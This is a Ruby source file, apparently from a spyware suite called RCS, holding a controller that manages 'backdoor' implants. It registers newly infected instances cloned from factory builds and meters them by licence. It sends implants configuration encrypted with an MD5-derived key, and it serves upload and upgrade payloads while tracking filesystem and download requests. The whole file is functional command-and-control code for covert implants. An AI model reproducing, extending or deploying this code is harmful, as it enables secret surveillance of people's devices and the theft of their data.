#
# Controller for the Backdoor objects
#
require 'rcs-db/license'

require 'rcs-common/crypt'

module RCS
module DB

class BackdoorController < RESTController
  include RCS::Crypt

  # retrieve the factory key of the backdoors
  # if the parameter is specified, it take only that class
  # otherwise, return all the keys for all the classes
  def factory_keys
    require_auth_level :server

    classes = {}

    # request for a specific instance
    if params['backdoor'] then
      Item.where({_kind: 'factory', build: params['backdoor']}).each do |entry|
          classes[entry[:build]] = entry[:confkey]
      end
    # all of them
    else
      Item.where({_kind: 'factory'}).each do |entry|
          classes[entry[:build]] = entry[:confkey]
        end
    end

    return RESTController.ok(classes)
  end

  
  # retrieve the status of a backdoor instance.
  def status
    require_auth_level :server
    
    request = JSON.parse(params['backdoor'])

    # by default demo is off
    demo = false

    # parse the platform to check if the backdoor is in demo mode ( -DEMO appended )
    demo = true unless request['subtype']['-DEMO'].nil?
    platform = request['subtype'].gsub(/-DEMO/, '').downcase

    # retro compatibility for older backdoors (pre 8.0) sending win32, win64, ios, osx
    case platform
      when 'win32', 'win64'
        platform = 'windows'
      when 'iphone'
        platform = 'ios'
      when 'macos'
        platform = 'osx'
    end

    # is the backdoor already in the database? (has it synchronized at least one time?)
    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: platform, demo: demo}).first

    # yes it is, return the status
    unless backdoor.nil?
      trace :info, "#{backdoor[:name]} is synchronizing (#{backdoor[:status]})"

      # if the backdoor was queued, but now we have a license, use it and set the status to open
      # a demo backdoor will never be queued
      if backdoor[:status] == 'queued' and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
        backdoor.status = 'open'
        backdoor.save
      end

      status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
      return RESTController.ok(status)
    end

    # search for the factory of that instance
    factory = Item.where({_kind: 'factory', build: request['build_id'], status: 'open'}).first

    # the status of the factory must be open otherwise no instance can be cloned from it
    return RESTController.not_found if factory.nil?

    # increment the instance counter for the factory
    factory[:counter] += 1
    factory.save

    trace :info, "Creating new instance for #{factory[:build]} (#{factory[:counter]})"

    # clone the new instance from the factory
    backdoor = factory.clone_instance

    # specialize it with the platform and the unique instance
    backdoor.platform = platform
    backdoor.instance = request['instance_id']
    backdoor.demo = demo

    # default is queued
    backdoor.status = 'queued'

    #TODO: add the upload files for the first sync

    # demo backdoor don't consume any license
    backdoor.status = 'open' if demo

    # check the license to see if we have room for another backdoor
    if demo == false and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
      backdoor.status = 'open'
    end

    # save the new instance in the db
    backdoor.save

    status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
    return RESTController.ok(status)
  end


  def config
    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first

    case @req_method
      when 'GET'
        config = backdoor.configs.where(:sent.exists => false).last
        return RESTController.not_found if config.nil?
        
        # encrypt the config for the backdoor using the confkey
        json_config = JSON.parse(config[:config])
        bson_config = BSON.serialize(json_config)
        enc_config = aes_encrypt(bson_config.to_s, Digest::MD5.digest(backdoor[:confkey]))
        
        return RESTController.ok(enc_config, {content_type: 'binary/octet-stream'})
        
      when 'DELETE'
        config = backdoor.configs.where(:sent.exists => false).last
        config.sent = Time.now.getutc.to_i
        config.save
        trace :info, "[#{@req_peer}] Configuration sent [#{params['backdoor']}]"
    end
    
    return RESTController.ok
  end


  # retrieve the list of upload for a given backdoor
  def uploads
    require_auth_level :server, :tech

    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
    list = backdoor.upload_requests

    return RESTController.ok(list)
  end

  # retrieve or delete a single upload entity
  def upload
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'GET'
        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
        upl = backdoor.upload_requests.where({ _id: request['upload_id']}).first
        content = GridFS.instance.get upl[:_grid].first
        trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{content.file_length.to_s_bytes}"
        return RESTController.ok(content.read, {content_type: content.content_type})
      when 'DELETE'
        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
        backdoor.upload_requests.destroy_all(conditions: { _id: request['upload_id']})
        trace :info, "[#{@req_peer}] Deleted the UPLOAD #{request}"
    end
    
    return RESTController.ok
  end
  
  # retrieve the list of upgrade for a given backdoor
  def upgrades
    require_auth_level :server, :tech
    
    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
    list = backdoor.upgrade_requests
    
    return RESTController.ok(list)
  end
  
  # retrieve or delete a single upgrade entity
  def upgrade
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'GET'
        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
        upgr = backdoor.upgrade_requests.where({ _id: request['upgrade_id']}).first
        content = GridFS.instance.get upgr[:_grid].first
        trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{content.file_length.to_s_bytes}"
        return RESTController.ok(content.read, {content_type: content.content_type})
      when 'DELETE'
        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
        backdoor.upgrade_requests.destroy_all
        trace :info, "[#{@req_peer}] Deleted the UPGRADE #{request}"
    end
    
    return RESTController.ok
  end

  # retrieve the list of download for a given backdoor
  def downloads
    require_auth_level :server, :tech

    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
    list = backdoor.download_requests

    return RESTController.ok(list)
  end

  def download
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'DELETE'
        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
        backdoor.download_requests.destroy_all(conditions: { _id: request['download_id']})
        trace :info, "[#{@req_peer}] Deleted the DOWNLOAD #{request}"
    end

    return RESTController.ok
  end

  # retrieve the list of filesystem for a given backdoor
  def filesystems
    require_auth_level :server, :tech
    
    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
    list = backdoor.filesystem_requests

    return RESTController.ok(list)
  end
  
  def filesystem
    require_auth_level :server, :tech

    request = JSON.parse(params['backdoor'])

    case @req_method
      when 'DELETE'
        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
        backdoor.filesystem_requests.destroy_all(conditions: { _id: request['filesystem_id']})
        trace :info, "[#{@req_peer}] Deleted the FILESYSTEM #{request}"
    end
    
    return RESTController.ok
  end

end

end #DB::
end #RCS::
